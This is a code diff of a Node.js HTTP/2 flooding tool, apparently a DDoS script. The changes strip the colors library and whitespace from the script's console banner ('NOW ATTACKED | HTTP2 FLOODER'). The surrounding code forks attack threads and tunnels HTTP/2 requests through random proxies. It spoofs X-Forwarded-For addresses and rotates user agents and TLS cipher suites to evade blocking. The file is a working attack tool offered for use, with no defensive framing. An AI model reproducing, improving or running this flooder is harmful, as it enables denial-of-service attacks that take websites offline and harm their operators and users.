@@ -1,3 +1,4 @@
+
 process.on('uncaughtException', function(er) {
     //console.log(er);
 });
@@ -14,7 +15,7 @@ const net = require('net');
 var path = require("path");
 const cluster = require('cluster');
 const http2 = require('http2');
-colors = require('colors');
+// colors = require('colors'); // Đã xóa thư viện màu sắc
 
 var fileName = __filename;
 var file = path.basename(fileName);
@@ -24,9 +25,8 @@ let COOKIES = undefined;
 let POSTDATA = undefined;
 
 if (process.argv.length < 8){
-    console['log']('		HTTP/2 By Virtualizaion' ['red']['bold']);
+    console.log('        HTTP/2 By Virtualizaion');
     console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads>');
-    //console.log(process.argv.length);
     process.exit(0);
 }
 
@@ -89,11 +89,11 @@ if (headerbuilders !== undefined){
             cluster.fork();
             console.log(`[Info] Threads ${i} Started Attacking`);
         }
-        console['log']('──────▄▀▄─────▄▀▄'['yellow']['bold']);
-        console['log']('─────▄█░░▀▀▀▀▀░░█▄'['yellow']['bold']);       
-        console['log']('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER'['yellow']['bold']); 
-        console['log']('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█'['yellow']['bold']);
-    
+        console.log('──────▄▀▄─────▄▀▄');
+        console.log('─────▄█░░▀▀▀▀▀░░█▄');
+        console.log('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER');
+        console.log('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█');
+
         setTimeout(() => {
             process.exit(1);
         }, process.argv[5] * 1000);
@@ -113,11 +113,11 @@ if (headerbuilders !== undefined){
             cluster.fork();
             console.log(`[Info] Threads ${i} Started Attacking`);
         }
-        console['log']('──────▄▀▄─────▄▀▄'['yellow']['bold']);
-        console['log']('─────▄█░░▀▀▀▀▀░░█▄'['yellow']['bold']);       
-        console['log']('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER'['yellow']['bold']); 
-        console['log']('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█'['yellow']['bold']);
-    
+        console.log('──────▄▀▄─────▄▀▄');
+        console.log('─────▄█░░▀▀▀▀▀░░█▄');
+        console.log('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER');
+        console.log('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█');
+
         setTimeout(() => {
             process.exit(1);
         }, process.argv[5] * 1000);
@@ -150,7 +150,7 @@ const sigalgs = [
 'rsa_pss_pss_sha256',
 'rsa_pss_pss_sha384',
 'rsa_pss_pss_sha512',
-'sm2sig_sm3',           
+'sm2sig_sm3',
 'ecdsa_secp384r1_sha384',
 'ecdsa_secp521r1_sha512',
 'rsa_pss_rsae_sha256',
@@ -166,8 +166,6 @@ var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
 } catch(error){
  console.log('Fail to load ua.txt')
 }
-
-
 
 function spoof(){
     return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
@@ -222,7 +220,7 @@ const cplist = [
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
 ];
-accept_header = [    
+accept_header = [
     '*/*',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
@@ -365,11 +363,11 @@ function startflood(){
                 var cipper = cipher()
 
                 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-                
+
                 var header = {
                     ":path": parsed.path,
                     "X-Forwarded-For": proxy[0],
-                    "X-Forwarded-Host": proxy[0], 
+                    "X-Forwarded-Host": proxy[0],
                     ":method": "GET",
                     "User-agent": uas,
                     "Origin": target,
@@ -380,16 +378,16 @@ function startflood(){
                 }
 
                 proxy = proxy.split(':');
-            
+
                 var http = require('http'),
                     tls = require('tls');
-                    
+
                 tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                 tls.DEFAULT_ECDH_CURVE;
                 tls.authorized = true;
                 tls.sync = true;
-            
-                var req = http.request({ 
+
+                var req = http.request({
                     //set proxy session
                     host: proxy[0],
                     port: proxy[1],
@@ -405,8 +403,8 @@ function startflood(){
                     req.end();
                     return;
                 });
-            
-                req.on('connect', function (res, socket, head) { 
+
+                req.on('connect', function (res, socket, head) {
                     //open raw request
                         const client = http2.connect(parsed.href, {
                             createConnection: () => tls.connect({
@@ -466,16 +464,16 @@ function startflood(){
 
                 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 proxy = proxy.split(':');
-            
+
                 var http = require('http'),
                     tls = require('tls');
-                    
+
                 tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                 tls.DEFAULT_ECDH_CURVE;
                 tls.authorized = true;
                 tls.sync = true;
-            
-                var req = http.request({ 
+
+                var req = http.request({
                     //set proxy session
                     host: proxy[0],
                     port: proxy[1],
@@ -491,8 +489,8 @@ function startflood(){
                     req.end();
                     return;
                 });
-            
-                req.on('connect', function (res, socket, head) { 
+
+                req.on('connect', function (res, socket, head) {
                     //open raw request
                         const client = http2.connect(parsed.href, {
                             createConnection: () => tls.connect({
@@ -555,16 +553,16 @@ function startflood(){
 
                 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 proxy = proxy.split(':');
-            
+
                 var http = require('http'),
                     tls = require('tls');
-                    
+
                 tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                 tls.DEFAULT_ECDH_CURVE;
 tls.authorized = true;
 tls.sync = true;
-            
-                var req = http.request({ 
+
+                var req = http.request({
                     //set proxy session
                     host: proxy[0],
                     port: proxy[1],
@@ -580,8 +578,8 @@ tls.sync = true;
                     req.end();
                     return;
                 });
-            
-                req.on('connect', function (res, socket, head) { 
+
+                req.on('connect', function (res, socket, head) {
                     //open raw request
                         const client = http2.connect(parsed.href, {
                             createConnection: () => tls.connect({
@@ -637,16 +635,16 @@ tls.sync = true;
 
                 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 proxy = proxy.split(':');
-            
+
                 var http = require('http'),
                     tls = require('tls');
-                    
+
                 tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                 tls.DEFAULT_ECDH_CURVE;
                 tls.authorized = true;
                 tls.sync = true;
-            
-                var req = http.request({ 
+
+                var req = http.request({
                     //set proxy session
                     host: proxy[0],
                     port: proxy[1],
@@ -662,8 +660,8 @@ tls.sync = true;
                     req.end();
                     return;
                 });
-            
-                req.on('connect', function (res, socket, head) { 
+
+                req.on('connect', function (res, socket, head) {
                     //open raw request
                         const client = http2.connect(parsed.href, {
                             createConnection: () => tls.connect({
@@ -719,3 +717,4 @@ tls.sync = true;
     }
 
 }
+
